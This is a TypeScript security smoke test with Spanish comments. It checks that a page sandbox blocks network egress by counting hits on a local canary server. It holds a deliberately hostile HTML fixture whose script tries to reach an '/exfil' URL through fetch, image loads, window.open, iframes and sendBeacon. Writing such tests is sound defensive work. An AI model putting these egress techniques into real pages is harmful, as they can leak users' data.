// Smoke de SEGURIDAD del runPage (hallazgos publish-safety, 2026-07-14).
// Mide lo ÚNICO que importa: EGRESO REAL. Un servidor canario local cuenta
// conexiones; la página del "desconocido" intenta alcanzarlo por 5 vías
// distintas (fetch, imagen, window.open, iframe, form). Con el candado de red
// el canario debe recibir CERO.
//
// (La primera versión de este smoke afirmaba "window.open devolvió un objeto
// => fuga" — falso: devolver una Window no prueba que la red se alcanzara. Lo
// que prueba una fuga es que ALGO llegue al otro lado. De ahí el canario.)
import { createServer } from "node:http";
import { runPageNoNetwork } from "@/lib/transform/run-page";

let hits = 0;
const server = createServer((req, res) => {
  hits++;
  console.log("  ⚠ CANARIO ALCANZADO:", req.method, req.url);
  res.end("leaked");
});
await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
const port = (server.address() as { port: number }).port;
const CANARY = `http://127.0.0.1:${port}/exfil`;
console.log("canario escuchando en", CANARY);

const EVIL = `<!doctype html><html><head></head><body>
<div id="out" data-ol-bake-c="0"></div>
<script>
  const U = ${JSON.stringify(CANARY)};
  try { fetch(U + "?v=fetch"); } catch(e) {}
  try { const i = new Image(); i.src = U + "?v=img"; } catch(e) {}
  try { window.open(U + "?v=open"); } catch(e) {}
  try { const f = document.createElement("iframe"); f.src = U + "?v=iframe"; document.body.appendChild(f); } catch(e) {}
  try { navigator.sendBeacon && navigator.sendBeacon(U + "?v=beacon", "x"); } catch(e) {}
  document.getElementById("out").textContent = "corrio";
</script>
</body></html>`;

const cap = await runPageNoNetwork(EVIL, 5000);
console.log("captura:", JSON.stringify(cap.containers["0"] ?? "(vacía)"));

// Margen para requests en vuelo.
await new Promise((r) => setTimeout(r, 800));
server.close();

if (hits > 0) {
  console.error(`SECURITY FAIL — el canario recibió ${hits} conexión(es): hay egreso de red`);
  process.exit(1);
}
console.log("SECURITY SMOKE PASS — cero egreso de red (fetch/img/window.open/iframe/beacon)");
process.exit(0);
